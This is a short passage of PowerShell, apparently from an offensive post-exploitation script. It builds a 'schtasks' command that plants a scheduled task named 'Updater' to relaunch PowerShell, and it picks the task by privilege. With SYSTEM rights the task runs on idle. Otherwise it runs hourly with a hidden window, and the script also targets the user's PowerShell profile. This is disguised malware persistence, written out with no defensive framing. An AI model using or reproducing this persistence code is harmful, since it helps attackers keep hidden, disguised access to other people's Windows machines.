...
{$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC ONIDLE /I 1 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`""}
else
{$Prof=$PROFILE.CurrentUserAllHosts;$Payload="schtasks /Create /SC HOURLY /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -WindowStyle Hidden`""}
